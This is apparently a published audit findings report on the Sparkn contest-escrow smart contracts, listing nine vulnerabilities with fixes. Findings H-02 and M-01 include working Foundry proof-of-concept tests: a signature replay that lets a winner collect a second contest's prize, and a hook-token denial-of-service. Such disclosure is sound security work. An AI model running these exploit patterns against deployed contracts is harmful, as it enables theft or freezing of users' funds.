# Sparkn  - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. If there are no winners organizer will still pay a fee](#H-01)
    - ### [H-02. Non unique contestId results in stolen funds](#H-02)
- ## Medium Risk Findings
    - ### [M-01. Hook on transfer tokens allows for DoS attack](#M-01)
    - ### [M-02. Malicious organizer can steal supporter winnings](#M-02)
- ## Low Risk Findings
    - ### [L-01. getProxyAddress doesn’t validate implementation against salt](#L-01)
    - ### [L-02. If there are more than >9500 winners some of them won't be paid](#L-02)
    - ### [L-03. Blacklisted users will fail prize distribution](#L-03)
    - ### [L-04. High number of winners will make reward distribution mechanism unusable](#L-04)
    - ### [L-05. Sponsor can rug participants by not sending funds](#L-05)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: CodeFox Inc.

### Dates: Aug 21st, 2023 - Aug 29th, 2023

[See more contest details here](https://www.codehawks.com/contests/cllcnja1h0001lc08z7w0orxx)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 2
   - Low: 5


# High Risk Findings

## <a id='H-01'></a>H-01. If there are no winners organizer will still pay a fee



## Summary
If there are no contest winners or participants at all organizer will lose stadium fee amount.
## Vulnerability Details
There might be a scenario when there's no participants or organizer is not satistfied with the quality of submissions. They will still have to use distribute mechanism to get their funds out which means they'll have to pay the owner 5\%. I'm not sure if it's the best way to handle this situation because the organizer hasn't been able to solve their problem.
## Impact
Loss of funds for organizer and sponsor
## Tools Used

## Recommendations
Have a backup action `claimNoWinner` which doesn't charge a fee
## <a id='H-02'></a>H-02. Non unique contestId results in stolen funds



## Summary
Non unique contest id allows for a signature replay attack between different versions. If an owner creates a new contest with the same contestId and organizer but a different implementation an attacker can reuse organizer's old signature to distribute funds.

## Vulnerability Details

Distribute by signature doesn't have AC set which allows anyone including the attacker to call this function.

```
function deployProxyAndDistributeBySignature(
    address organizer,
    bytes32 contestId,
    address implementation,
    bytes calldata signature,
    bytes calldata data
) public returns (address) {
```

https://github.com/Cyfrin/2023-08-sparkn/blob/main/src/ProxyFactory.sol#L152

Consider a case when there are 2 contests with the same contestId organized by the same entity BUT the implementation is different due to a version upgrade for example. There's NOTHING preventing that from happening since `setContest` only checks for salt collision

```
bytes32 salt = _calculateSalt(organizer, contestId, implementation);
if (saltToCloseTime[salt] != 0) revert ProxyFactory__ContestIsAlreadyRegistered();
```

https://github.com/Cyfrin/2023-08-sparkn/blob/main/src/ProxyFactory.sol#L114

This means that if prize distribution for the first contest happened via signature scheme then one of the winners can reuse the same signature to distribute funds for the second one.

### POC

Add to `ProxyFactoryTest.t.sol`:

```
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("", "") {
    }

    function mint(address _to, uint256 _amount) external {
        _mint(_to, _amount);
    }
}

function testReplaySignature() public {
    vm.prank(factoryAdmin);
    Distributor distributor2 = new Distributor(address(proxyFactory), stadiumAddress);

    bytes32 constestId = keccak256(abi.encode("Jason", "001"));
    bytes32 salt1 = keccak256(abi.encode(TEST_SIGNER, constestId, address(distributor)));
    bytes32 salt2 = keccak256(abi.encode(TEST_SIGNER, constestId, address(distributor2)));

    MockToken token = new MockToken();
    token.mint(proxyFactory.getProxyAddress(salt1, address(distributor)), 1e18);
    token.mint(proxyFactory.getProxyAddress(salt2, address(distributor2)), 1e18);

    address winner = address(42);

    (bytes32 digest, bytes memory sendingData, bytes memory signature) = createSignatureByASigner2(TEST_SIGNER_KEY, address(winner), address(token));
    assertEq(ECDSA.recover(digest, signature), TEST_SIGNER);

    bytes memory data = abi.encodeWithSelector(
        ProxyFactory.deployProxyAndDistributeBySignature.selector,
        TEST_SIGNER, constestId, address(distributor), signature, sendingData
    );

    vm.prank(factoryAdmin);
    proxyFactory.setContest(TEST_SIGNER, constestId, block.timestamp + 1, address(distributor));
    vm.warp(2);
    proxyFactory.deployProxyAndDistributeBySignature(
        TEST_SIGNER, constestId, address(distributor), signature, sendingData
    );
    assertEq(token.balanceOf(winner), 95e16);

    // another contest with the same organizer and constestId BUT different implementation
    vm.prank(factoryAdmin);
    proxyFactory.setContest(TEST_SIGNER, constestId, block.timestamp + 1, address(distributor2));

    vm.warp(10);
    proxyFactory.deployProxyAndDistributeBySignature(
        TEST_SIGNER, constestId, address(distributor2), signature, sendingData
    );

    // winner claims prize for the second constest
    assertEq(token.balanceOf(winner), 2*95e16);
}
```
### Test
```
forge test --match-test testReplaySignature -vvv
```

### Output
```
[PASS] testReplaySignature() (gas: 1514636)
```


## Impact

Stolen funds

## Tools Used

## Recommendations
1. Easiest fix would be to set AC to onlyOwner for `deployProxyAndDistributeBySignature`
2. An alternative solution would be to make a contestId unique
```
mapping(uint => contestInfo) contest;

struct contestInfo {
 address organiser;
 address implementation;
 uint closeTime;
};

```
With this implementation one just needs to pass contestId when distributing funds. No need for (organiser, constestId, implementation). This is more expensive in terms of gas but you can free up storage once the contest finishes and get a refund.

# Medium Risk Findings

## <a id='M-01'></a>M-01. Hook on transfer tokens allows for DoS attack



## Summary
If prize token is ERC777 then one of the unhappy winners can revert a transaction preventing the rest from getting their prizes.

## Vulnerability Details
An unhappy winner can revert a transaction after receiving funds:
```
uint256 amount = totalAmount * percentages[i] / BASIS_POINTS;
erc20.safeTransfer(winners[i], amount);
```
https://github.com/Cyfrin/2023-08-sparkn/blob/main/src/Distributor.sol#L147

### POC

Add to `OnlyDistributorTest.t.sol`
```
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {Address} from "openzeppelin/utils/Address.sol";

contract ExploitToken is ERC20 {
    address public doNotCall;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function setHookException(address a) external {
        doNotCall = a;
    }
    function mint(address _to, uint256 _amount) external {
        _mint(_to, _amount);
    }
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to == doNotCall || !Address.isContract(to)) {
            return;
        }
        (bool s,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(s, "transfer failed");
    }
}

contract UnhappyWinner {
    function tokensReceived(address,address,uint) external {
        revert();
    }
}

function testDoSAttack() public {
    ExploitToken token = new ExploitToken("Exploit Token", "EXT");
    token.setHookException(address(distributor));
    token.mint(address(distributor), 100e18);
    UnhappyWinner unhappyWinner = new UnhappyWinner();
    vm.startPrank(factoryAdmin);
    uint winnerCount = 10;
    address[] memory winners = new address[](winnerCount);
    uint[] memory percentages = new uint[](winnerCount);
    for (uint i = 0; i < winnerCount; i++) {
        winners[i] = address(uint160(i + 1));
    }
    winners[0] = address(unhappyWinner);
    for (uint i = 0; i < winnerCount; i++) {
        percentages[i] = 9500 / winnerCount;
    }

    vm.expectRevert("transfer failed");
    distributor.distribute(address(token), winners, percentages, bytes("0"));
    vm.stopPrank();
}
```

### Test
```forge test --match-test testDoSAttack -vvv```

### Output
```[PASS] testDoSAttack() (gas: 845199)```
Commenting `winners[0] = address(unhappyWinner);` will cause a test to fail because no exception will be emitted.


## Impact
While an organiser can remove unhappy winners and distribute their shares to other participants it'll probably be both painful and costly if there are a few of them so it's better to avoid it.
## Tools Used

## Recommendations
Don't whitelist tokens allowing transfer hooks
## <a id='M-02'></a>M-02. Malicious organizer can steal supporter winnings



## Summary
The contract allows an organizer to manage their funds. This is NOT what an escrow is supposed to do.

## Vulnerability Details
Escrow definition from investopedia:
Escrow is a legal concept describing a financial agreement whereby an asset or money is held by a third party on behalf of two other parties that are in the process of completing a transaction.

This allows an organizer to send funds to themselves

https://github.com/Cyfrin/2023-08-sparkn/blob/main/src/ProxyFactory.sol#L130

## Impact
Loss of winnings for supporters if keys are compromised or an organizer is malicious.

## Tools Used

## Recommendations

By definition of an escrow funds should be managed by a third party. Therefore the owner or another trusted entity should be in charge of distributing winnings.

# Low Risk Findings

## <a id='L-01'></a>L-01. getProxyAddress doesn’t validate implementation against salt



## Summary
If a backend doesn’t send the right implementation contract address this may result in loss of funds.

## Vulnerability Details
The function below doesn't validate that the same implementation was used for salt:
```
function getProxyAddress(bytes32 salt, address implementation) public view returns (address proxy) {
    bytes memory code = abi.encodePacked(type(Proxy).creationCode, uint256(uint160(implementation)));
    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));
    proxy = address(uint160(uint256(hash)));
}
```
If there's an implementation upgrade and backend sends a wrong implementation contract this will result in loss of funds for organizer


## Impact
Possible loss funds for sponsor
## Tools Used

## Recommendations
No easy way to fix with the current implementation that I can think of
## <a id='L-02'></a>L-02. If there are more than >9500 winners some of them won't be paid



## Summary
If there are >10000-COMISSION_FEE winner some of them won’t be paid.

## Vulnerability Details
Assuming each user gets a minimum reward of 1 bip (0.01%) organizer can reward a maximum of 9500 users. If this is a constest like https://codingcompetitionsonair.withgoogle.com/ with lots of users and where submissions are graded automatically this might become a problem, i.e if the prize pool is really large, like 1M some users won't be able to get 100\$.

## Impact

Loss of winnings for some users

## Tools Used

## Recommendations

Consider resizing 1 bip to = 0.001\% or 0.00001\%
## <a id='L-03'></a>L-03. Blacklisted users will fail prize distribution



## Summary
Tokens such as USDT and USDC allow blacklisting which may cause distribute() to fail.
## Vulnerability Details
Prize distribution will fail because of blacklisted users. If signature mechanism is used this will be really painful. If there are multiple blacklisted accounts which may happen if there are a lot winners this will be a lot of pain.

## Impact
Prize distribution will fail which is lost funds on txn fees for organizer/owner. And a lot of pain if signature scheme is used and there multiple banned accounts.

## Tools Used

## Recommendations

Use merkle trees for distributing prizes. The contract will only store the root of the tree and have a claim method which verifies a proof sent by a user.
## <a id='L-04'></a>L-04. High number of winners will make reward distribution mechanism unusable



## Summary
If there's a high number of winners organiser or owner will have to pay a large txn fee which might make the contract unusable.

## Vulnerability Details

### POC
```
MockERC20 weth;

function setUp() public {
    // only deploy contracts
    distributor = new Distributor(factoryAdmin, stadiumAddress);
    // ----> weth = new MockERC20("Wrapped Ether", "WETH");
}

function testWithManyWinners() public {
    weth.mint(address(distributor), 100e18);
    vm.startPrank(factoryAdmin);
    uint winnerCount = 100;
    address[] memory winners = new address[](winnerCount);
    uint[] memory percentages = new uint[](winnerCount);
    for (uint i = 0; i < winnerCount; i++) {
        winners[i] = address(uint160(i + 1));
    }

    for (uint i = 0; i < winnerCount; i++) {
        percentages[i] = 9500 / winnerCount;
    }

    distributor.distribute(address(weth), winners, percentages, bytes("0"));
    vm.stopPrank();
}
```

### Test
```
forge test --match-test testWithManyWinners -vvv  --gas-report
```

### Output

```
| src/Distributor.sol:Distributor contract |                 |         |         |         |         |
|------------------------------------------|-----------------|---------|---------|---------|---------|
| Deployment Cost                          | Deployment Size |         |         |         |         |
| 608747                                   | 3358            |         |         |         |         |
| Function Name                            | min             | avg     | median  | max     | # calls |
| distribute                               | 2805427         | 2805427 | 2805427 | 2805427 | 1       |
```

For 100 winners gas usage is at around 3M. Assuming gas cost of 100 gwei which was an average of 2021 bull market craze we get
```
>>> 2801501*100/1e9
0.2801501
```
which means 0.3 ETH is needed to distribute prizes. Further assuming eth price of 3000\$ (average of 2021) we get around 1000\$ for prize distribution!
There could actually be even more winners (up to 9500) so the price might be even higher. This a really high price and organizer may refuse to distribute prizes. Owner can refuse either because 5\% might not be enough to cover the costs.

## Impact

Supporters lose winnings or have to wait when it's economically viable for organizer or owner to distribute funds.

## Tools Used

## Recommendations

Use merkle trees for distributing prizes. The contract will only store the root of the tree and have a claim method which verifies a proof sent by a user.
## <a id='L-05'></a>L-05. Sponsor can rug participants by not sending funds



## Summary
Sponsor can rug participants by not funding the constest
## Vulnerability Details
A malicious sponsor can promise contest participants a large prize pool but then change their mind. They'll get work for free, essentially.
## Impact
Supporters won't receive their winnings
## Tools Used

## Recommendations
1. Contest should not be active before it's funded
2. Transfer tokens when creating a contest


